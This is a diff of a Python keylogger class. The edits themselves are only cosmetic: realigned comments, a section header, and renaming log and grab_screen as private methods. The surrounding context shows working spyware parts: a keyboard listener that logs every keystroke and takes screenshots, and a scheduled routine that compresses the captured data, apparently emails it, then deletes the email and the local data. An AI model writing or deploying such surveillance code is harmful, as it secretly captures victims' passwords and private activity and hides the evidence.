@@ -35,14 +35,15 @@ class Keylogger():
             self.listener = keyboard.Listener(
                 on_press=self._on_press, 
                 on_release=self._on_release)
-            self.listener.start()                               # Starts the keyboard listener 
+            self.listener.start()                                   # Starts the keyboard listener 
             self._scheduler()
         else:
             with keyboard.Listener(
                 on_press=self._on_press,
                 on_release=self._on_release) as listener:
                     listener.join()
-
+       
+    # --------------------------------- Private Methods --------------------------------
     def _scheduler(self): 
         """ 
         Set up a scheduled task to tun the self._logic method
@@ -51,7 +52,7 @@ class Keylogger():
         """         
         schedule = sched.scheduler(time.time)
         schedule.enter(self.seconds,1,self._logic)                  # After time seconds, it starts the logic function
-        schedule.run()                                      # Start the scheduler
+        schedule.run()                                              # Start the scheduler
 
     def _logic(self):
         self._compress_data()
@@ -59,7 +60,7 @@ class Keylogger():
         self._delete_email()
         self._delete_data()
 
-    def log(self,key,special=None):
+    def _log(self,key,special=None):
         """
         Write a log into the app.log file.
 
@@ -91,7 +92,7 @@ class Keylogger():
                 self.last_word = []
                 logging.info(key)
                 now = time.time()
-                self.grab_screen(now)
+                self._grab_screen(now)
             else:
                 logging.info(f"{''.join(self.last_word)}")
                 self.last_word = []
@@ -178,17 +179,17 @@ class Keylogger():
     def _on_press(self,key):
         try:
             print(f"{key.char} pressed")
-            self.log(key.char)
+            self._log(key.char)
         except AttributeError:
             print(f"Special key {key}")
-            self.log(key, True)
+            self._log(key, True)
 
     def _on_release(self,key):
         if key == keyboard.Key.esc:
             # Stop listener
             return False
 
-    def grab_screen(self, name):
+    def _grab_screen(self, name):
         """
         Take a screenshot of the current screen.
 
